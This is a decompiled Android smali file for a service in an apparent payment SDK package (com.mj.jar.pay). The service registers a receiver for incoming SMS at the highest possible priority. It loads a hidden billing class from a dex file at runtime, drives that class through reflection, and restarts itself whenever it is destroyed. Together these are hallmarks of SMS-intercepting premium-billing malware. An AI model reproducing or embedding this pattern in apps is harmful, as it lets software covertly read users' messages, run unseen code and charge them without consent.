.class public Lcom/mj/jar/pay/SmsServices;
.super Landroid/app/Service;
.source "SmsServices.java"


# instance fields
.field private insms:Lcom/mj/jar/pay/InSmsReceiver;

.field private smsClass:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class",
            "<*>;"
        }
    .end annotation
.end field

.field private smsObj:Ljava/lang/Object;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 9
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 11
    new-instance v0, Lcom/mj/jar/pay/InSmsReceiver;

    invoke-direct {v0}, Lcom/mj/jar/pay/InSmsReceiver;-><init>()V

    iput-object v0, p0, Lcom/mj/jar/pay/SmsServices;->insms:Lcom/mj/jar/pay/InSmsReceiver;

    .line 12
    iput-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    .line 13
    iput-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    .line 9
    return-void
.end method

.method private inItSmsServices()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 16
    const/4 v0, 0x0

    .line 17
    .local v0, "localIntentFilter":Landroid/content/IntentFilter;
    new-instance v0, Landroid/content/IntentFilter;

    .end local v0    # "localIntentFilter":Landroid/content/IntentFilter;
    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 18
    .restart local v0    # "localIntentFilter":Landroid/content/IntentFilter;
    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 19
    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 20
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->insms:Lcom/mj/jar/pay/InSmsReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/mj/jar/pay/SmsServices;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 22
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    if-nez v1, :cond_1

    .line 23
    :cond_0
    iput-object v2, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    .line 24
    iput-object v2, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    .line 26
    :try_start_0
    sget-object v1, Lcom/mj/jar/pay/MjPaySDK;->filePath:Ljava/lang/String;

    invoke-static {p0, v1}, Lcom/mj/jar/pay/DexClass;->install(Landroid/content/Context;Ljava/lang/String;)Lcom/mj/jar/pay/DexClass;

    move-result-object v1

    .line 27
    const-string v2, "com.mj.billing.SmsServices"

    invoke-virtual {v1, v2}, Lcom/mj/jar/pay/DexClass;->getDexClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    .line 26
    iput-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    .line 28
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    invoke-virtual {v1}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v1

    iput-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 32
    :cond_1
    :goto_0
    return-void

    .line 29
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 6
    .param p1, "paramIntent"    # Landroid/content/Intent;

    .prologue
    .line 37
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    if-eqz v1, :cond_0

    .line 39
    :try_start_0
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    const-string v2, "onBind"

    .line 40
    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Landroid/content/Intent;

    aput-object v5, v3, v4

    .line 39
    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 41
    .local v0, "localMethod":Ljava/lang/reflect/Method;
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    .line 42
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    .line 41
    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/IBinder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 45
    .end local v0    # "localMethod":Ljava/lang/reflect/Method;
    :goto_0
    return-object v1

    .line 43
    :catch_0
    move-exception v1

    .line 45
    :cond_0
    const/4 v1, 0x0

    goto :goto_0
.end method

.method public onCreate()V
    .locals 6

    .prologue
    .line 49
    invoke-direct {p0}, Lcom/mj/jar/pay/SmsServices;->inItSmsServices()V

    .line 50
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    if-eqz v1, :cond_0

    .line 52
    :try_start_0
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    const-string v2, "onCreate"

    .line 53
    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Landroid/app/Service;

    aput-object v5, v3, v4

    .line 52
    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 54
    .local v0, "localMethod":Ljava/lang/reflect/Method;
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p0, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 57
    .end local v0    # "localMethod":Ljava/lang/reflect/Method;
    :cond_0
    :goto_0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 58
    return-void

    .line 55
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 5

    .prologue
    .line 61
    iget-object v2, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    if-eqz v2, :cond_0

    .line 63
    :try_start_0
    iget-object v2, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    const-string v3, "onDestroy"

    .line 64
    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    .line 63
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 65
    .local v1, "localMethod":Ljava/lang/reflect/Method;
    iget-object v2, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 68
    .end local v1    # "localMethod":Ljava/lang/reflect/Method;
    :cond_0
    :goto_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 69
    .local v0, "localIntent":Landroid/content/Intent;
    const-class v2, Lcom/mj/jar/pay/SmsServices;

    invoke-virtual {v0, p0, v2}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 70
    invoke-virtual {p0, v0}, Lcom/mj/jar/pay/SmsServices;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 71
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 73
    return-void

    .line 66
    .end local v0    # "localIntent":Landroid/content/Intent;
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 6
    .param p1, "paramIntent"    # Landroid/content/Intent;
    .param p2, "paramInt"    # I

    .prologue
    .line 76
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    if-eqz v1, :cond_0

    .line 78
    :try_start_0
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsClass:Ljava/lang/Class;

    .line 79
    const-string v2, "onStart"

    const/4 v3, 0x3

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v5, Landroid/app/Service;

    aput-object v5, v3, v4

    const/4 v4, 0x1

    .line 80
    const-class v5, Landroid/content/Intent;

    aput-object v5, v3, v4

    const/4 v4, 0x2

    sget-object v5, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v4

    .line 79
    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 81
    .local v0, "localMethod":Ljava/lang/reflect/Method;
    iget-object v1, p0, Lcom/mj/jar/pay/SmsServices;->smsObj:Ljava/lang/Object;

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p0, v2, v3

    const/4 v3, 0x1

    .line 82
    aput-object p1, v2, v3

    const/4 v3, 0x2

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v2, v3

    .line 81
    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 85
    .end local v0    # "localMethod":Ljava/lang/reflect/Method;
    :cond_0
    :goto_0
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 86
    return-void

    .line 83
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 89
    const/4 p2, 0x1

    .line 90
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
